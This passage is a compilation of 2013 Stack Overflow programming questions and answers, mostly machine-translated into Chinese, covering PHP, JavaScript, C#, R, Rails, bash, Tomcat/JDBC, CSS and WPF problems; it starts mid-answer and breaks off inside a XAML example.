> 
> 时间：2013-02-12T12:39:39.180

You could try using [ctype_digit()](http://www.php.net/manual/en/function.ctype-digit.php) to determine if the returned string contains a "clean" int, or if it contains a floating point dot somewhere, and then just have two sets of Y/N functions; One for string-ints and one for string-floats.

# javascript - 在鼠标移动时实现页面倾斜和缩放

> ID：14832449
> 
> 赞同：1
> 
> 时间：2013-02-12T12:21:34.510
> 
> 标签：javascript, html, css-transitions

当我看到这个时，我正试图在[聊天中搜索一些消息：](https://chat.stackoverflow.com/)

![Stackoverflow 聊天](../Images/7e87a0ba667b83e9af02eee1366b146a.png)

随着鼠标向左或向右移动，内容向左或向右倾斜，随着鼠标上下移动，内容在放大或缩小。这是一个非常棒的效果，我真的很喜欢。我想实现相同的。

我现在检查了同一个页面，我看不到这个。

有人可以告诉我该怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:14:55.930

这会将屏幕旋转到鼠标指针的方向。

这是[CodePen.io上的一个示例](http://codepen.io/anon/full/aJzsE)

您只需为事件添加一个 EventListener`body`并`mousemove`应用 css3 转换。

由于我以前从未这样做过，您可能需要稍微调整一下转换。

我将该`webkitTransform`属性用于示例目的。您可能需要查找兼容性列表

![在此处输入图像描述](../Images/76ceb081d4a0de17de1dad2b96d126f4.png)

这是在图像中进行转换的代码

```
window.addEventListener("mousemove",function(e) {

  var width = window.innerWidth;
  var height = window.innerHeight;
  var clientHeight = document.body.clientHeight;
  var skew = {}
  skew.y = (20 * ((e.x / width) - 0.5)) 
  skew.x = -(20 * ((e.y / height) - 0.5));

  document.body.style.webkitTransform = "perspective("+clientHeight+"px) rotateX("+skew.x+"deg) rotateY("+skew.y+"deg)"
}) 
```

*编辑：使用bodys clientHeight作为视角，看起来好一点*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:55:31.463

好吧，它很难看，但您可以修改转换以使其看起来更逼真：http: [//jsfiddle.net/c5E6g/](http://jsfiddle.net/c5E6g/)

```
<div id="container">
    Hey!
</div> 
```

CSS：

```
#container{
    background-color:gray;
    border:1px solid #111;
} 
```

JavaScript：

```
document.onmousemove = function(e) {
    document.getElementById("container").style.transform = "skewx("+e.clientX+"deg) translatex(150px)";
}; 
```

它只是一个改变变换 skewX 值的函数。我刚刚使用了原始 X 光标位置，您可以使用页面宽度来计算更合适的值。或者更好的是，也稍微修改一下 skewY。

# c# - C# BinaryReader 无法访问已关闭的文件

> ID：14832456
> 
> 赞同：4
> 
> 时间：2013-02-12T12:21:52.093
> 
> 标签：c#, asp.net, stream, binarystream

控制器：

```
private readonly Dictionary<string, Stream> streams;

        public ActionResult Upload(string qqfile, string id)
        {
            string filename;
            try
            {
                Stream stream = this.Request.InputStream;
                if (this.Request.Files.Count > 0)
                {
                    // IE
                    HttpPostedFileBase postedFile = this.Request.Files[0];
                    stream = postedFile.InputStream;
                }
                else
                {
                    stream = this.Request.InputStream;
                }

                filename = this.packageRepository.AddStream(stream, qqfile);
            }
            catch (Exception ex)
            {
                return this.Json(new { success = false, message = ex.Message }, "text/html");
            }

            return this.Json(new { success = true, qqfile, filename }, "text/html");
        } 
```

添加流的方法：

```
 public string AddStream(Stream stream, string filename)
        {

            if (string.IsNullOrEmpty(filename))
            {
                return null;
            }

            string fileExt = Path.GetExtension(filename).ToLower();
            string fileName = Guid.NewGuid().ToString();
            this.streams.Add(fileName, stream);
        } 
```

我正在尝试像这样读取二进制流：

```
Stream stream;
            if (!this.streams.TryGetValue(key, out stream))
            {
                return false;
            }

    private const int BufferSize = 2097152;

                            using (var binaryReader = new BinaryReader(stream))
                            {
                                int offset = 0;
                                binaryReader.BaseStream.Position = 0;
                                byte[] fileBuffer = binaryReader.ReadBytes(BufferSize); // THIS IS THE LINE THAT FAILS
    .... 
```

当我在调试模式下查看流时，它显示它可以读取 = true、seek = true、lenght = 903234 等。

但我不断收到： **无法访问已关闭的文件**

当我在本地/调试模式（VS IIS）运行 mvc 站点时，这工作正常，而在“RELEASE”模式下（当站点发布到 iis 时）不起作用。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-15T08:52:56.147

在这里找到解决方案：

[上传文件异常](http://channel9.msdn.com/Forums/TechOff/104616-ASPNet-20-Uploading-file-exception)

解决方案：

在生产环境中添加**“requestLengthDiskThreshold”**

```
<system.web>
<httpRuntime executionTimeout="90" maxRequestLength="20000" useFullyQualifiedRedirectUrl="false" requestLengthDiskThreshold="8192"/>
</system.web> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:47:26.540

您似乎依赖于您无法控制的对象的生命周期（HttpRequest 对象的属性）。如果您希望存储流的数据，则立即将该数据复制到字节数组或类似文件中会更安全

您可以将 AddStream 更改为

```
 public string AddStream(Stream stream, string filename)
    {

        if (string.IsNullOrEmpty(filename))
        {
            return null;
        }

        string fileExt = Path.GetExtension(filename).ToLower();
        string fileName = Guid.NewGuid().ToString();
        var strLen = Convert.ToInt32(stream.Length);
        var strArr = new byte[strLen];
        stream.Read(strArr, 0, strLen);
        //you will need to change the type of streams acccordingly
        this.streams.Add(filename,strArr); 
    } 
```

然后，您可以在需要流的数据时使用该数组，这使您可以完全控制存储数据的对象的生命周期

# r - 从 ROCR 预测对象中检索分类器性能指标

> ID：14832460
> 
> 赞同：3
> 
> 时间：2013-02-12T09:37:47.547
> 
> 标签：r

我使用 ROCR 来测量我的数据集上各种分类算法的性能。虽然我可以使用以下代码示例相对轻松地检索 AUC 指标：

```
predictions <- predict(rfmodel, test, type="prob")
pred.obj <- prediction(predictions[,2], data$response)
rfperf <- performance(pred.obj, "tpr","fpr")
print(sprintf("random forest AUC %f", as.numeric(performance(pred.obj,"auc")@y.values))) 
```

我在检索其他指标（如精度、召回率、f 等）时遇到问题，我可以将其作为单个值包含在论文的表格中。我尝试了以下方法：

```
> p <- performance(pred.obj,"prec", "rec")
> as.numeric(p@x.values)
Error: (list) object cannot be coerced to type 'double' 
```

我可以绘制值，但这不是我想要的。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T09:57:50.123

问题是输出是一个列表。尝试 as.numeric( unlist ( p@x.values) )

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T09:55:10.930

这与函数 perf 的返回对象的结构有关。使用 str 会有所帮助。

p@x.values 是一个列表，包含一个元素，该元素是一个数值向量。只需使用

```
p@x.values[[1]] 
```

提取向量。

# php - PHP popen() 带引号的路径

> ID：14832467
> 
> 赞同：0
> 
> 时间：2013-02-12T12:22:40.420
> 
> 标签：php, popen

我正在尝试在 Windows 中使用 PHP 的 popen() 函数运行 exe 文件。一切都很完美，除非我的 .exe 文件的路径中有空格。所以这有效：

```
popen("start /b D:\\test.exe", r); 
```

这不会：

```
popen("start /b D:\\path with space\\test.exe", r); 
```

通常在 CMD 中，当您想要这样做时，您只需将路径放在引号中，例如：“D:\path with space\test.exe”，这适用于 exec() 函数，但不适用于 popen()。

我试过了：

```
popen('start /b "D:\\path with space\\test.exe"', r); 
```

但它不起作用。

任何人都知道如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:26:39.793

使用该[`escapeshellarg()`](http://php.net/manual/en/function.escapeshellarg.php)功能添加空格。

# c# - C# 等价于 rest 客户端

> ID：14832468
> 
> 赞同：-1
> 
> 时间：2013-02-12T12:22:48.807
> 
> 标签：c#, java, rest

这是rest客户端的java代码。我在创建时遇到问题。如何在此客户端上创建 C# 等效项？我需要一些例子

```
public class RestServiceClient {    

    public static final String BASE_URL = "http://localhost:9080/PPAUploadDocRestService/rest/uploadDocument";

    public static void main(String[] args) {
                    addDocument();

    }

    public static void addDocument() {
        try {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(BASE_URL);

            MultipartEntity reqEntity = new MultipartEntity();  

            FileBody fileBody = new FileBody(new File("C:/projects/Db2PpaPpacardsppastages.xsd")); 
            reqEntity.addPart("file", fileBody);

            reqEntity.addPart("fileName", new StringBody("Db2PpaPpacardsppastages.xsd"));

            reqEntity.addPart("processId", new StringBody("2872"));

            reqEntity.addPart("document", new StringBody(generateDocument()));
            httppost.setEntity(reqEntity);          

            HttpResponse response = httpclient.execute(httppost);

            System.out.println(response.getStatusLine().getReasonPhrase());
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    private static String generateDocument() {
        JSONObject object = new JSONObject();
        object.put("docNum", "NickDoc");
        object.put("docDate", "" + new Date().getTime());
        object.put("docTypeId", "49");
        object.put("questionId", "1728");
        object.put("description", "test by NIvanov REST");
        object.put("resolution", "");
        object.put("workGroupMembers", "");
        object.put("inDocNum", "inNickDoc");
        object.put("inDocDate", "" + new Date().getTime());
        object.put("outDocNum", "outNickDoc");
        object.put("outDocDate", "" + new Date().getTime());
        object.put("docName", "NickDocName");
        object.put("employeeId", "1");
        object.put("cardId", "647");
        object.put("bpmDocId", "");
        object.put("docCode", "TNT");

        return object.toString();
    }

} 
```

我一直在研究使用`HttpWebRequest`and`HttpWebResponse`对象。这是真的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:27:05.280

有可用的开源库，请查看以下链接，

[http://restsharp.org/](http://restsharp.org/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T17:14:37.370

查看以下链接 [http://www.codeproject.com/Articles/17449/Send-a-content-type-multipart-form-data-request-fr](http://www.codeproject.com/Articles/17449/Send-a-content-type-multipart-form-data-request-fr) 或[http://www.paraesthesia.com/archive/2009 /12/16/posting-multipartform-data-using-.net-webrequest.aspx](http://www.paraesthesia.com/archive/2009/12/16/posting-multipartform-data-using-.net-webrequest.aspx)

# jquery - ActionController::RoutingError（没有路由匹配

> ID：14832471
> 
> 赞同：0
> 
> 时间：2013-02-12T12:22:51.330
> 
> 标签：jquery, ruby-on-rails, ruby-on-rails-3, rails-routing

我正在尝试添加或删除嵌套的 has_many 对象，如下所示

```
class Question < ActiveRecord::Base
  has_many :comments
end

= form_for @question, :url => {:action => "create"} do |f|
  = f.label :name
  = f.text_field :name
  #comments
  = link_to 'Add Comment", add_comment_question_path, method: :get
  = f.submit 
```

:javascript

```
 $('#add_comment').click(function() {
    $('#comments').append("#{escape_javascript(render(:partial => "comment"))}");
  }); 
```

在我的 _comment.html.haml

```
= fields_for @question.comments do |c|
  = c.label :msg
  = c.text_field :msg 
```

在我的控制器中

```
def add_comment
   @question.comments << Comment.new
end 
```

在路线.rb

```
resources :questions do
  get :add_comment, :on => :member
end 
```

但是我在加载时遇到路由错误`question/new.html.haml`。我也跑来`rake routes`获取正确的指定网址。为什么我会收到此错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:39:22.413

我假设错误在`add_comment_question_path`. 这个命名路由需要一个问题资源来传递给它，比如`add_comment_question_path(@question)`. 但这仍然不适用于您的情况，因为您正在尝试以`@question`相同的形式创建。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:35:46.687

你有没有尝试过：

```
= form_for @question, :url => questions_path do |f| 
```

`questions_path`应该是自动生成的`routes.rb`。这些可以通过 running 枚举`rake routes`，它显示可用的路由，然后可以用`route_path`或调用`route_url`。

高温高压

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:45:54.450

尝试添加方法发布：

```
form_for(@question, :url => {:action => "create"}, :html => {:method => "post"} ) do |f| 
```

并将 routes.rb 编辑为：

**在路线.rb**

```
resources :questions do
   member do
     get :add_comment
   end
end 
```

# c# - 正则表达式，初学者的例子

> ID：14832474
> 
> 赞同：1
> 
> 时间：2013-02-12T12:23:02.897
> 
> 标签：c#, regex

我试图找出一个非常简单的正则表达式，但我无法重建，为什么它不起作用。我以为我喜欢正则表达式的东西，但不幸的是它似乎不是这样：D

这是我要匹配的表达式：

`interval=4|termination=2012-09-18 22:00:00|days=3`

这样，我想要一个看起来像这样的匹配数组

```
match = array({"interval" => "4", "termination" => "2012-09-18 22:00:00", "days" = "3"});
//(pseudocode) 
```

我在 C# 中使用它，因为我想要有模式名称。我用这种模式尝试过：

```
(.*)((termination=(?<termination>(.{19})))|(interval=(?<interval>(\d*)))|(days=(?<days>(\d*))))*(.*) 
```

谁能指出我失败的地方？

提前谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:26:26.970

我相信您来自 PHP 背景，您可以使用`string.Split`并将输出强制输出到字典，例如：

```
string str = "interval=4|termination=2012-09-18 22:00:00|days=3";
Dictionary<string,string> dict = str.Split('|')
                                    .Select(r => r.Split('='))
                                    .ToDictionary(t => t[0], t=> t[1]); 
```

输出将是：

![在此处输入图像描述](../Images/9545dce7463d3c7137532356e8ad9039.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:26:41.357

`|`是正则表达式的特殊字符，表示交替。由于要匹配 literal `|`，因此需要对其进行转义。

```
interval=(?<interval>\d*)\|termination=(?<termination>.{19})\|days=(?<days>\d*) 
```

我还冒昧地清理了您似乎不需要的捕获组。我还修改了正则表达式，以便它与[`Regex.Matches()`](http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.regex.matches.aspx)方法一起使用。

我假设输入按指定的顺序出现。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:26:47.813

你得到什么结果？我敢打赌`(.*)`，由于贪婪，将消耗整个字符串，而其他部分（以 为后缀`*`）将匹配零次。所以匹配会成功，但捕获组将是空的。这就是你正在经历的吗？

我的建议是按照`Split`Habib 的建议进行，但如果你想修复你的正则表达式，那么：

*   使第一组[非贪婪（懒惰）](http://www.regular-expressions.info/repeat.html)：`(.*?)`
*   修复字段的顺序，并`|`按照 nhahtdh 的建议进行转义，或者：
*   如果字段可能出现乱序，您可能需要重复它们以接受零、一个或多个（对于正则表达式来说不是最好的工作，但可行）：

    ```
    (
        (termination=(...)|interval=(...)|days=(...))
        (\| (termination=(...)|interval=(...)|days=(...)) )*
    )? 
    ```

    （为了便于阅读，添加了空格和换行符）

# linux - 统计bash中可执行文件的数量

> ID：14832477
> 
> 赞同：-2
> 
> 时间：2013-02-12T12:23:12.243
> 
> 标签：linux, bash, shell, ubuntu

我已经看到了很多关于这个主题的答案，但我不想使用 `find`. 我已经写了这个，但有些东西不起作用：

```
function CountEx()
{
    count=0
    for file in `ls $1`
    do
        echo "file is $file"
        if [ -x $file ]
        then
            count=`expr $count + 1`
        fi
    done
    echo "The number of executable files in this dir is: $count"
}
while getopts x:d:c:h opt
do
    case $opt in
        x)CountEx $OPTARG;;
        d)CountDir $OPTARG;;
        c)Comp $OPTARG;;
        h)help;;
        *)echo "Please Use The -h Option to see help"
        break;;
    esac
done 
```

我正在使用这个脚本，如下所示：

```
yaser.sh -x './..../...../.....' 
```

shell 运行它，然后它输出： `The number of executable files in this dir is: 0` 当此目录中有许多可执行文件时。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:35:54.920

If your goal is to count directories, there are so many options.

The `find` way, which you said you don't want:

```
CountDir() {
  if [[ ! -d "$1" ]]; then
    echo "ERROR: $1 is not a directory." >&2
    return 1
  fi
  printf "Total: %d\n" $(find "$1" -depth 1 -type d | wc -l)
} 
```

The `for` way, similar to your example:

```
CountDir() {
  if [[ ! -d "$1" ]]; then
    echo "ERROR: $1 is not a directory." >&2
    return 1
  fi
  count=0
  for dir in "$1"/*; do
    if [[ -d "$dir" ]]; then
      ((count++))
    fi
  done
  echo "Total: $count"
} 
```

The `set` way, which skips the loop entirely.

```
CountDir() {
  if [[ ! -d "$1" ]]; then
    echo "ERROR: $1 is not a directory." >&2
    return 1
  fi
  set -- "$1"/*/
  echo "Total: $#"
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:42:06.300

计算可执行文件的数量（如标题所示）

```
 count=0 
 for file in yourdir/*; do 
     if [ -x $file ]; then 
         count=$((count+1)); 
     fi; 
 done; 
 echo "total ${count}" 
```

要计算文件夹，只需将`-x`测试更改为`-d`

# c#-4.0 - 使用 c# 代码将字节数组转换为 pdf

> ID：14832490
> 
> 赞同：3
> 
> 时间：2013-02-12T12:23:35.613
> 
> 标签：c#-4.0, pdf, linq-to-sql, bytearray

我有一个包含更多二进制类型列的表。我必须将这些字节数组转换为 pdf。我用 c# 代码编写如下：

```
this.Cursor = Cursors.WaitCursor;
        using (CMEntities myEntity = new CMEntities())
        {
            myEntity.ContextOptions.LazyLoadingEnabled = false;
            var r = (from b in myEntity.FileDatas
                     orderby b.Oid
                     where b.Status == null
                     select b).Skip(Directory.GetFiles(@"D:\test\FromBinary\", "*.*", SearchOption.AllDirectories).Length).Take(500);
            button5.Text = Directory.GetFiles(@"D:\test\FromBinary\", "*.*", SearchOption.AllDirectories).Length.ToString();
            int i = 1;
            try
            {
                FileSystemStoreObject fileSystem = new FileSystemStoreObject();
                foreach (var item in r)
                {
                    byte[] a = item.Content;
                    File.WriteAllBytes(@"D:\test\FromBinary\" + item.Oid + "-" + item.FileName, a);
                    fileSystem.Oid = item.Oid;
                    fileSystem.FileName = item.FileName;
                    fileSystem.Size = item.size;
                    item.Status = 1;
                    myEntity.FileSystemStoreObjects.AddObject(fileSystem);
                    if (i == 500)
                    {
                        break;
                    }
                    i++;
                    fileSystem = new FileSystemStoreObject();
                }
                myEntity.SaveChanges();
            }
            catch { }
        } 
```

但是当我的程序开始工作时，我的一些 pdf 文件没有打开。我收到此文件损坏的错误或.... 我怎样才能获得健康的 pdf 文件？请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-08-11T16:24:10.220

如果有些人对 Pdf 也有问题，我建议下载[PDF 规范](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/pdf_reference_1-7.pdf)。

实际上，您可以看到 PDF 文件必须以`%PDF-`plus 版本开头，例如`%PDF-1.4`并以 结尾`%%EOF`，并且前两行是字节偏移量和`startxref`...如果您使用 Notepad++ 查看生成的 PDF，您可以确定是否您的文件是否完整，以及缺少哪个部分。

# sql-server - Tomcat 未连接到 SQL Server Express

> ID：14832493
> 
> 赞同：-2
> 
> 时间：2013-02-12T12:23:52.113
> 
> 标签：sql-server, tomcat, jdbc

我有一个在 Tomcat 下运行的 webapp，通过 jdbc 连接到 SQL Server Express 以获取数据。在我第一次用于开发的 Vista 机器上运行良好。我一直在尝试将它移到可以实时运行的 Windows 7 机器上，但它不起作用，而且我已经没有东西要检查了。需要帮忙。两台机器上的安装（我的部分）似乎完全相同。但我应该提一下，新机器（它不工作的地方）正在运行另一个应用程序，它连接到相同或另一个版本的 SQL Server。这是Tomcat日志中的错误。

```
Allvarlig: StandardWrapper.Throwable
java.lang.NullPointerException
    at nu.isr.hll.webshop.core.HLListProcess.initialize(HLListProcess.java:73)
    at nu.isr.hll.webshop.servlets.HLListServlet.init(HLListServlet.java:31)
    at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1266)
    at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1185)
    at org.apache.catalina.core.StandardWrapper.allocate(StandardWrapper.java:857)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:136)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
    at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1813)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722) 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-13T10:32:56.800

未加载 jdbc 驱动程序。

看起来问题归结为有缺陷的 Microsoft jdbc 驱动程序。根据文档，sqljdbc4 不需要显式注册驱动程序。版本 4 应该会自动执行此操作。在 Microsoft Vista 开发机器上运行良好。但是当我在 Windows 7 上安装应用程序时它不起作用（它们是两个不同的操作系统，我猜这很重要。）

必须包括 Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");

现在它起作用了！

# json - 将 json 与 extjs 连接起来

> ID：14832496
> 
> 赞同：0
> 
> 时间：2013-02-12T12:24:02.220
> 
> 标签：json, extjs, extjs4, extjs4.1

在我的示例登录表单中，我试图连接到 json 并获得结果，即如果用户名和密码匹配，则为 true，否则为 false。

**json**（*存在于我的项目文件夹中*）

```
{
 "form": {
    "login": [
    {
      "username": "venkat",
      "password": "123"
    },
    {
      "username": "admin",
      "password": "345"
    }
  ]
} 
```

我创建了一个如下所示的函数。但我不知道下一步该做什么。sencha 文档有诸如 ajax、MVC 架构代理之类的方法，我没有使用这些方法。

```
function checkJson(username, password){
    //What should I write here?
    //Return true, if match
    //else false
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:55:37.127

切勿写下未加密的密码。也永远不要通过互联网发送它们！

您可以像这样在 extjs 中处理您的 JSON（这是正确的问题吗？）：

```
function checkJson(jsonString){
    var json = Ext.decode(jsonString);

    //json.form.login[0].username;
    //json.form.login[0].password;
} 
```

但是@Izhaki 说了什么。这是糟糕的 javascript，应该在服务器端进行此类检查。

# asp.net - Http 注入攻击示例

> ID：14832497
> 
> 赞同：1
> 
> 时间：2013-02-12T12:24:07.057
> 
> 标签：asp.net, security

我正在尝试找到一个很好的 http 注入攻击示例，以便更好地理解这种威胁......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T00:16:51.060

我认为您的意思是 HTTP 标头注入？这也称为 CRLF 注入或 HTTP 响应拆分和/或走私。

OWASP 测试指南是一个好的开始：[https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OWASP-DV-016)](https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OWASP-DV-016))

如果您想了解更多详细信息，我建议您查看 Amit Kleins 的工作： http: [//www.packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf](http://www.packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T16:04:01.220

OWASP 网站始终是解决 Web 安全问题的好地方：[OWASP HTML 注入](https://www.owasp.org/index.php/HTML_Injection)

# javascript - Regular expression in javascript for at least one character including special character

> ID：14832501
> 
> 赞同：0
> 
> 时间：2013-02-12T12:24:19.010
> 
> 标签：javascript, regex

I am trying to validate a text box, to have any character, but not empty.

This is my current code

```
condition = '\\d{9}';
condition = new RegExp(condition);
    if (condition.test(element.val())) {
             //some code
        } 
```

But, i want it to **allow all characters, but not empty,** I have already tried .{50}, /.*/s and [\s\S]* , But none seem to be working.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:26:52.737

It looks like you use jQuery. Try to pass value to [`$.trim`](http://api.jquery.com/jQuery.trim/) to cut all non-space characters:

```
if ($.trim(element.val()).length > 0) {
    // ...
} 
```

In case if you don't use jQuery, there is [`String.trim()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/Trim) method available. Check the compatibility information at [**MDN**](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/Trim#Compatibility).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:26:01.297

If it can be any character, but not empty, you could just test the length of the input's current value. E.g.

```
if (element.val().length > 0) {
    //some code
} 
```

If you must use a regex then the following will work:

```
condition = /.+/; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:26:30.677

Your regex matches only strings with 9 digits. For at least a single character, use `.*[^\\s].*` which ensures at least one non-space character.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T12:35:17.113

Not sure if I understand the question:

```
condition = '^[\\s\\S]+$';
condition = new RegExp(condition);

if (condition.test(element.val())) {
    //some code
} 
```

It will pass for any string that as at least one character, and fails for empty string. Notice that also whitespace are considered, so if `element.val()` is `" "` it will returns `true`. If you want to returns `false` in this case too, you have just to remove `\\s` from the string above.

# css - CSS - 在固定定位元素下滚动内容？

> ID：14832507
> 
> 赞同：3
> 
> 时间：2013-02-12T12:24:32.030
> 
> 标签：css, scroll, position, css-position

**HTML：**

```
<div id="container">
    <ul>
        <li><a href="#first">first</a></li>
        <li><a href="#second">second</a></li>
        <li><a href="#third">third</a></li>
    </ul>
    <div id="somecontainer">
        <div id="first">
        </div>
        <div id="second">
        </div>
        <div id="third">
        </div>
    </div>
</div> 
```

**演示： http:** [//jsfiddle.net/JRn​​Dz /](http://jsfiddle.net/JRnDz/)

**问题：** 当您单击名为“second”的链接时，页面应跳转到 id 为“second”的 div。但是，它不会显示整个 div，而只会显示其中的一部分（150px-50px=100px）。div 的顶部被切断。

**问题：** 单击“第二个”链接后如何显示整个 div？

**我已经尝试过：** 将相对定位和顶部：50px 添加到容器中：

```
#container {
  position: relative;
  top: 50px;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:51:03.983

@ipsnow72 写的解决方案比较清楚。

如果您愿意，可以使用 jquery 的插件 ScrollTo 并使用 offset 参数。 [http://demos.flesler.com/jquery/scrollTo/](http://demos.flesler.com/jquery/scrollTo/)

```
$(...).scrollTo( '#yourelement', {offset:-50} ); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-12T13:35:13.817

这取决于这段代码的用途，但如果你添加

```
#someconteiner div{
    padding-top:50px;
    margin-bottom:-50px;
    position:relative;
    display:block;
} 
```

并使用 z-indexes 玩一下它的工作原理：http: [//jsfiddle.net/JRn​​Dz /2/](http://jsfiddle.net/JRnDz/2/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:34:43.913

你可以试试这个：

```
<div id="container">
<ul>
    <li><a href="#first">first</a></li>
    <li><a href="#secondJump">second</a></li>
    <li><a href="#third">third</a></li>
</ul>
<div id="someconteiner">
    <div id="first">
    </div>
    <a name="secondJump"></a>
    <div id="second">
    </div>
    <div id="third">
    </div>
</div>
</div> 
```

将要跳转到的位置作为锚点放在要跳转到的 div 上方。

显然你会对第 1 和第 3 做同样的事情。

**编辑：** 尝试简单地从您的 ul 中删除固定位置

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T13:02:03.023

这个怎么样：

```
<div id="container">
<ul>
    <li><a href="#first">first</a></li>
    <li><a href="#secondAnchor">second</a></li>
    <li><a href="#third">third</a></li>
</ul>
<div id="someconteiner">
    <div id="first">
    </div>
    <a name="secondAnchor" style="padding-top: 50px; margin-top: -50px;"></a>
    <div id="second">
    </div>
    <div id="third">
    </div>
</div>
</div> 
```

请参阅：[固定位置导航栏隐藏锚点](https://stackoverflow.com/questions/9047703/fixed-position-navbar-obscures-anchors)

# c# - 如何将模板/数据模板添加到 TableCell

> ID：14832511
> 
> 赞同：0
> 
> 时间：2013-02-12T12:24:53.080
> 
> 标签：c#, xaml, templates, datatemplate, xmltable

我四处搜索，但没有找到任何真正有用的东西；我的目的是显示一个指定`DataTemplate`的指定`Class`：

```
 <FlowDocumentScrollViewer>
        <FlowDocument>
            <Table BorderBrush="Black" BorderThickness="1" CellSpacing="0">
                <Table.Columns>
                    <TableColumn></TableColumn>
                    <TableColumn></TableColumn>
                    <TableColumn></TableColumn>
                    <TableColumn></TableColumn>
                </Table.Columns>
                <Table.RowGroups>
                    <TableRowGroup >
                        <TableRow>
                            <TableCell>DataTemplate1</TableCell>//class1
                            <TableCell>DataTemplate2</TableCell>//class2
                            <TableCell>DataTemplate3</TableCell>//class3
                            <TableCell>DataTemplate4</TableCell>//class4
                        </TableRow>
                    </TableRowGroup> 
                </Table.RowGroups>
            </Table>
        </FlowDocument>
    </FlowDocumentScrollViewer> 
```

重要的是，它必须是唯一的 XAML 解决方案，因为我加载了这个 xaml，`XamlReader.Load()`所以不会有代码隐藏文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T13:26:19.863

对于您需要模板的每种类型，您可以在 Resources 中的某处仅使用 DataType 属性定义一个 DataTemplate。要让它们显示出来，您需要将数据项绑定到单元格中的某些 ContentControl。这是一个示例，其中包含用于 int 和 bool 的模板以及与集合项的绑定：

```
<FlowDocumentScrollViewer>
  <FlowDocumentScrollViewer.Resources>
    <DataTemplate DataType="{x:Type system:Int32}">
      <TextBlock Text="{Binding StringFormat='A number: {0}'}" />
    </DataTemplate>
    <DataTemplate DataType="{x:Type system:Boolean}">
      <TextBlock Text="{Binding StringFormat='A bool: {0}'}" />
    </DataTemplate>
  </FlowDocumentScrollViewer.Resources>
  <FlowDocument>
    <Table BorderBrush="Black"
           BorderThickness="1"
           CellSpacing="0">
      <Table.Columns>
        <TableColumn></TableColumn>
        <TableColumn></TableColumn>
        <TableColumn></TableColumn>
        <TableColumn></TableColumn>
      </Table.Columns>
      <Table.RowGroups>
        <TableRowGroup>
          <TableRow>
            <TableCell>
              <BlockUIContainer>
                <ContentControl Content="{Binding MixedTypeList[0]}" />
              </BlockUIContainer>
            </TableCell>
            <TableCell>
              <BlockUIContainer>
                <ContentControl Content="{Binding MixedTypeList[1]}" />
              </BlockUIContainer>
            </TableCell>
            <TableCell>
              <BlockUIContainer>
